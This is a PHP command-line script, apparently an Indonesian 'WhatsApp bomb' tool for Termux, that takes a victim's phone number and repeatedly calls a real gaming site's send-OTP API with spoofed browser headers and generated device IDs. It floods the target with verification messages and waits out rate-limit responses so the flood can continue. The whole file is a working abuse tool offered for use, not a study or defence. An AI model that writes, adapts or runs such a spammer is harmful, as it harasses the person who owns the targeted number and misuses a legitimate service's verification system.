<?php

// ==============================================
// CYBER TERMINAL | API SESSION
// ==============================================

system("clear");
$R = "\033[0m";
$C = "\033[1;36m";
$G = "\033[1;32m";
$Y = "\033[1;33m";
$E = "\033[1;31m";
$M = "\033[1;35m";
$D = "\033[2m";

// LOGO BANNER TENGKORAK & KOTAK
function banner(): void
{
    global $E, $C, $G, $Y, $D, $R;
    
    echo $C . "          .-\" '''''\"-.       \n";
    echo $C . "         /            \\      \n";
    echo $C . "        |              |     \n";
    echo $C . "        |,  .-.  .-.  ,|     \n";
    echo $C . "        | )(__/  \\__)( |     \n";
    echo $E . "        |/     /\\     \\|     \n";
    echo $E . "        (_     ^^     _)     \n";
    echo $E . "         \\__|IIIIII|__/      \n";
    echo $E . "          | \\IIIIII/ |       \n";
    echo $E . "          \\          /       \n";
    echo $E . "           `--------`        \n";
    echo $Y . " ╭────────────────────────────╮\n";
    echo $Y . " │ " . $R . " BOM WHATSAPP •> NEW 2026 " . $Y . " │\n";
    echo $Y . " │ " . $R . "  tutorialinjectid.my.id  " . $Y . " │\n";
    echo $Y . " ╰────────────────────────────╯\n";
    
    echo $D . "   RUSMANA-ID • TERMUX • CODE   \n\n" . $R;
}

// NORMALISASI NOMOR INDONESIA
function normalizePhone(string $input): ?string
{
    $number = preg_replace('/\D+/', '', trim($input));
    if ($number === '') return null;
    
    if (str_starts_with($number, '62')) {
        $number = substr($number, 2);
    } elseif (str_starts_with($number, '0')) {
        $number = substr($number, 1);
    }

    if (!preg_match('/^8[0-9]{8,12}$/', $number)) return null;
    return '+62' . $number;
}

// UUID V4
function deviceId(): string
{
    $file = __DIR__ . '/.device-id';
    if (is_file($file)) {
        $saved = trim((string) @file_get_contents($file));
        if (preg_match('/^[0-9a-f]{8}-(?:[0-9a-f]{4}-){3}[0-9a-f]{12}$/i', $saved)) return $saved;
    }

    $bytes = random_bytes(16);
    $bytes[6] = chr((ord($bytes[6]) & 0x0f) | 0x40);
    $bytes[8] = chr((ord($bytes[8]) & 0x3f) | 0x80);
    $hex = bin2hex($bytes);
    
    $id = sprintf('%s-%s-%s-%s-%s', substr($hex, 0, 8), substr($hex, 8, 4), substr($hex, 12, 4), substr($hex, 16, 4), substr($hex, 20, 12));
    @file_put_contents($file, $id);
    return $id;
}

// ================= START =================

banner();

if (!function_exists('curl_init')) {
    echo $E . "[ERROR] Ekstensi cURL tidak tersedia.\n" . $R;
    exit(1);
}

echo $C . " [+] Masukkan Nomor WA : " . $R;
$input = readline();
$phone = normalizePhone($input);

if ($phone === null) {
    echo $E . " [!] Format nomor tidak valid.\n" . $R;
    exit(1);
}

for ($i = 1; $i <= 5; $i++) {
$username = '0' . substr($phone, 3);
$device = deviceId();
$userAgent = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Mobile Safari/537.36';

echo $C . " [*] Mengirim BOM ke: " . $G . $phone . "\n" . $R;

$url = 'https://api.duniagames.co.id/api/user/api/v2/user/send-otp';
$payload = json_encode(['phoneNumber' => $phone, 'userName' => $username], JSON_UNESCAPED_SLASHES);

$headers = [
    'Accept: application/json, text/plain, */*',
    'Accept-Language: id',
    'Content-Type: application/json',
    'Origin: https://duniagames.co.id',
    'Referer: https://duniagames.co.id/',
    'Ciam-Type: FR',
    'x-device: ' . $device,
    'User-Agent: ' . $userAgent,
];

$ch = curl_init($url);
curl_setopt_array($ch, [
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $payload,
    CURLOPT_HTTPHEADER => $headers,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_CONNECTTIMEOUT => 15,
    CURLOPT_TIMEOUT => 30,
]);

$response = curl_exec($ch);
$status = curl_getinfo($ch, CURLINFO_HTTP_CODE);

if ($response === false) {
    echo $E . " [X] Koneksi gagal!\n" . $R;
    exit(1);
}

$json = json_decode($response, true);

// ================= RESPONSE HANDLING =================

if ($status == 200) {
    echo $G . " [✔] SUCCESS: Bom WhatsApp dikirim!\n" . $R;

} elseif ($status == 429) {
    $message = $json['status']['message'] ?? "Please wait 60 seconds";

    if (preg_match('/(\d+)/', $message, $matches)) {
        $waktu_tunggu = (int)$matches[1];
        //echo $Y . "[!] LIMIT: " . $message . "\n" . $R;
        
        for ($i = $waktu_tunggu; $i > 0; $i--) {
            $menit = floor($i / 60);
            $detik = $i % 60;
            
            // Format statis agar selalu menampilkan menit dan detik (contoh: 00m 59s, 01m 05s)
            $format = sprintf("%02dm %02ds", $menit, $detik);
            
            echo "\r" . $C . " [~] Menunggu: " . $Y . $format . " " . $R . "\033[K";
            sleep(1);
        }
        
        echo "\r\033[K"; 
        echo $G . " [✔] READY: Waktu tunggu selesai.\n" . $R;
        
    } else {
        //echo $Y . "[!] LIMIT: " . $message . "\n" . $R;
    }

} else {
    $errorMsg = $json['status']['message'] ?? 'Unknown Error';
    echo $E . " [X] ERROR " . $status . ": " . $errorMsg . "\n" . $R;
}

echo "\n";
}
?>